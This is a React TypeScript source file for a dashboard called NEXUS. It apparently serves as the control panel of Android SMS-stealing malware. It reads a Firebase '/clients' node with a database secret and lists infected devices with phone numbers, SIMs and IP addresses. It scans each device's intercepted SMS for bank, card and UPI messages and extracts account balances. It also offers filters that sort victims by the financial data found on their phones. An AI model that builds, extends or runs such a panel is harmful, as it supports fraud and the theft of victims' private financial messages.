import { useCallback, useEffect, useMemo, useState } from 'react'
import {
  LogOut,
  RefreshCw,
  Search,
  Database,
  Filter,
} from 'lucide-react'
import { LoginScreen } from './components/LoginScreen'
import { DeviceCard } from './components/DeviceCard'
import { StatsBar } from './components/StatsBar'
import { DeviceDrawer } from './components/DeviceDrawer'
import { ToastStack } from './components/Toast'
import { useToasts } from './hooks/useToasts'
import { fetchPath } from './lib/firebase'
import { detectSmsType, hasUpiSignal, parseBankFromSms } from './lib/parse'
import type { Device, FilterTab, SortKey } from './lib/types'

function mapClient(id: string, raw: Record<string, unknown>): Device {
  const phone = String(raw.phone || raw.phoneNumber || raw.number || raw.sim || '')
  const battery = Number(raw.battery || raw.batteryLevel || raw.bat || 0)
  const lastSeen = Number(raw.lastSeen || raw.last_seen || raw.timestamp || raw.time || 0)
  const onlineFlag = raw.online ?? raw.isOnline ?? raw.status
  let online = false
  if (typeof onlineFlag === 'boolean') online = onlineFlag
  else if (typeof onlineFlag === 'string') online = onlineFlag.toLowerCase() === 'online'
  else if (lastSeen) online = Date.now() - lastSeen < 3 * 60 * 1000

  let hasBank = false
  let hasCard = false
  let hasUpi = false
  let latestBalance: string | undefined
  const smsNode = (raw.sms || raw.messages || {}) as Record<string, unknown>
  for (const v of Object.values(smsNode)) {
    const body = String((v as Record<string, unknown>)?.body || (v as Record<string, unknown>)?.message || '')
    const t = detectSmsType(body)
    if (t === 'bank') {
      hasBank = true
      const parsed = parseBankFromSms(body, 'x', Date.now())
      if (parsed.balance && !latestBalance) latestBalance = parsed.balance
    }
    if (t === 'card') hasCard = true
    if (hasUpiSignal(body)) hasUpi = true
  }
  if (raw.hasBank || raw.bankSms) hasBank = true
  if (raw.hasCard || raw.cardData) hasCard = true
  if (raw.hasUpi || raw.upi) hasUpi = true
  if (raw.balance || raw.latestBalance) latestBalance = String(raw.balance || raw.latestBalance)

  return {
    id,
    name: raw.name ? String(raw.name) : raw.model ? String(raw.model) : undefined,
    model: raw.model ? String(raw.model) : undefined,
    androidVersion: raw.androidVersion || raw.android || raw.osVersion
      ? String(raw.androidVersion || raw.android || raw.osVersion)
      : undefined,
    sdk: raw.sdk ? String(raw.sdk) : undefined,
    phone: phone || undefined,
    network: raw.network || raw.carrier || raw.provider
      ? String(raw.network || raw.carrier || raw.provider)
      : undefined,
    battery: isNaN(battery) ? undefined : battery,
    isCharging: !!(raw.isCharging || raw.charging),
    online,
    lastSeen: lastSeen || undefined,
    ip: raw.ip ? String(raw.ip) : undefined,
    storage: raw.storage ? String(raw.storage) : undefined,
    cpu: raw.cpu ? String(raw.cpu) : undefined,
    sim1: raw.sim1 ? String(raw.sim1) : undefined,
    sim2: raw.sim2 ? String(raw.sim2) : undefined,
    hasUpi,
    hasBank,
    hasCard,
    latestBalance,
    raw,
  }
}

export default function App() {
  const { toasts, push, dismiss } = useToasts()
  const [creds, setCreds] = useState<{ url: string; key: string } | null>(null)
  const [devices, setDevices] = useState<Device[]>([])
  const [loading, setLoading] = useState(false)
  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [filter, setFilter] = useState<FilterTab>('all')
  const [sort, setSort] = useState<SortKey>('newest')
  const [q, setQ] = useState('')
  const [drawerOpen, setDrawerOpen] = useState(false)

  const selected = useMemo(
    () => devices.find((d) => d.id === selectedId) || null,
    [devices, selectedId]
  )

  const loadDevices = useCallback(async () => {
    if (!creds) return
    setLoading(true)
    try {
      const data = await fetchPath<Record<string, Record<string, unknown>>>(creds.url, 'clients', creds.key)
      if (!data || typeof data !== 'object') {
        setDevices([])
        return
      }
      const list = Object.entries(data).map(([id, raw]) => mapClient(id, raw || {}))
      setDevices(list)
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'Error'
      if (msg === 'PERMISSION_DENIED') {
        push({
          type: 'error',
          title: 'Permission denied',
          message: 'Need a Database Secret with read access to /clients.',
        })
      } else {
        push({ type: 'error', title: 'Refresh failed', message: msg })
      }
    } finally {
      setLoading(false)
    }
  }, [creds, push])

  useEffect(() => {
    if (!creds) return
    loadDevices()
    const id = setInterval(loadDevices, 15000)
    return () => clearInterval(id)
  }, [creds, loadDevices])

  const filtered = useMemo(() => {
    let list = [...devices]
    if (filter === 'online') list = list.filter((d) => d.online)
    else if (filter === 'offline') list = list.filter((d) => !d.online)
    else if (filter === 'upi') list = list.filter((d) => d.hasUpi)
    else if (filter === 'bank') list = list.filter((d) => d.hasBank)
    else if (filter === 'card') list = list.filter((d) => d.hasCard)

    if (q.trim()) {
      const s = q.trim().toLowerCase()
      list = list.filter(
        (d) =>
          d.id.toLowerCase().includes(s) ||
          (d.name || '').toLowerCase().includes(s) ||
          (d.phone || '').toLowerCase().includes(s) ||
          (d.model || '').toLowerCase().includes(s)
      )
    }

    list.sort((a, b) => {
      if (sort === 'name') return (a.name || a.id).localeCompare(b.name || b.id)
      if (sort === 'battery') return (b.battery || 0) - (a.battery || 0)
      if (sort === 'oldest') return (a.lastSeen || 0) - (b.lastSeen || 0)
      return (b.lastSeen || 0) - (a.lastSeen || 0)
    })
    return list
  }, [devices, filter, sort, q])

  const stats = useMemo(() => {
    const online = devices.filter((d) => d.online).length
    return {
      total: devices.length,
      online,
      offline: devices.length - online,
      bank: devices.filter((d) => d.hasBank).length,
      card: devices.filter((d) => d.hasCard).length,
    }
  }, [devices])

  function handleConnect(url: string, key: string) {
    setCreds({ url, key })
  }

  function logout() {
    setCreds(null)
    setDevices([])
    setSelectedId(null)
    setDrawerOpen(false)
  }

  if (!creds) {
    return (
      <>
        <LoginScreen onConnect={handleConnect} pushToast={push} />
        <ToastStack items={toasts} onDismiss={dismiss} />
      </>
    )
  }

  const FILTERS: { id: FilterTab; label: string }[] = [
    { id: 'all', label: 'All' },
    { id: 'online', label: 'Online' },
    { id: 'offline', label: 'Offline' },
    { id: 'upi', label: 'UPI' },
    { id: 'bank', label: 'Bank' },
    { id: 'card', label: 'Card' },
  ]

  return (
    <div className="min-h-full flex flex-col bg-slate-950">
      <header className="sticky top-0 z-30 border-b border-slate-800/80 bg-slate-950/90 backdrop-blur-md">
        <div className="mx-auto max-w-7xl px-4 sm:px-6 py-3 flex items-center justify-between gap-4">
          <div className="flex items-center gap-3 min-w-0">
            <div className="h-9 w-9 rounded-xl bg-sky-500/15 border border-sky-400/25 flex items-center justify-center shrink-0">
              <Database className="h-4 w-4 text-sky-300" />
            </div>
            <div className="min-w-0">
              <p className="text-sm font-semibold text-white tracking-tight">NEXUS</p>
              <p className="text-[10px] text-slate-500 truncate max-w-[200px] sm:max-w-xs font-mono">
                {creds.url.replace(/^https?:\/\//, '')}
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={loadDevices}
              disabled={loading}
              className="inline-flex items-center gap-1.5 rounded-lg border border-slate-700 bg-slate-900 px-3 py-1.5 text-xs text-slate-300 hover:bg-slate-800 transition disabled:opacity-50"
            >
              <RefreshCw className={`h-3.5 w-3.5 ${loading ? 'animate-spin' : ''}`} />
              <span className="hidden sm:inline">Refresh</span>
            </button>
            <button
              onClick={logout}
              className="inline-flex items-center gap-1.5 rounded-lg border border-slate-700 bg-slate-900 px-3 py-1.5 text-xs text-slate-300 hover:bg-rose-500/10 hover:border-rose-500/30 hover:text-rose-300 transition"
            >
              <LogOut className="h-3.5 w-3.5" />
              <span className="hidden sm:inline">Logout</span>
            </button>
          </div>
        </div>
      </header>

      <main className="flex-1 mx-auto w-full max-w-7xl px-4 sm:px-6 py-6 space-y-6">
        <StatsBar {...stats} />

        <div className="flex flex-col sm:flex-row gap-3 sm:items-center justify-between">
          <div className="flex flex-wrap gap-1.5">
            {FILTERS.map((f) => (
              <button
                key={f.id}
                onClick={() => setFilter(f.id)}
                className={`rounded-lg px-3 py-1.5 text-xs font-medium transition ${
                  filter === f.id
                    ? 'bg-sky-500/20 text-sky-300 border border-sky-500/30'
                    : 'bg-slate-900 text-slate-400 border border-slate-800 hover:border-slate-700'
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>
          <div className="flex gap-2">
            <div className="relative flex-1 sm:w-56">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-500" />
              <input
                value={q}
                onChange={(e) => setQ(e.target.value)}
                placeholder="Search name, phone, ID…"
                className="w-full rounded-lg border border-slate-800 bg-slate-900 pl-9 pr-3 py-1.5 text-xs text-slate-200 placeholder:text-slate-600 focus:border-sky-500/50 focus:ring-1 focus:ring-sky-500/30"
              />
            </div>
            <div className="relative">
              <Filter className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-500 pointer-events-none" />
              <select
                value={sort}
                onChange={(e) => setSort(e.target.value as SortKey)}
                className="appearance-none rounded-lg border border-slate-800 bg-slate-900 pl-8 pr-7 py-1.5 text-xs text-slate-300 focus:border-sky-500/50"
              >
                <option value="newest">Newest</option>
                <option value="oldest">Oldest</option>
                <option value="name">Name</option>
                <option value="battery">Battery</option>
              </select>
            </div>
          </div>
        </div>

        {loading && devices.length === 0 ? (
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-3">
            {Array.from({ length: 6 }).map((_, i) => (
              <div key={i} className="h-36 skeleton" />
            ))}
          </div>
        ) : filtered.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-slate-800 bg-slate-900/30 px-6 py-16 text-center">
            <p className="text-slate-400 text-sm">No devices match this view</p>
            <p className="text-xs text-slate-600 mt-1">
              {devices.length === 0
                ? 'Waiting for data under /clients — check path and permissions.'
                : 'Try clearing search or switching filter.'}
            </p>
          </div>
        ) : (
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-3">
            {filtered.map((d) => (
              <DeviceCard
                key={d.id}
                device={d}
                selected={d.id === selectedId}
                onClick={() => {
                  setSelectedId(d.id)
                  setDrawerOpen(true)
                }}
              />
            ))}
          </div>
        )}
      </main>

      <DeviceDrawer
        device={selected}
        baseUrl={creds.url}
        dbKey={creds.key}
        open={drawerOpen}
        onClose={() => setDrawerOpen(false)}
        pushToast={push}
      />
      <ToastStack items={toasts} onDismiss={dismiss} />
    </div>
  )
}
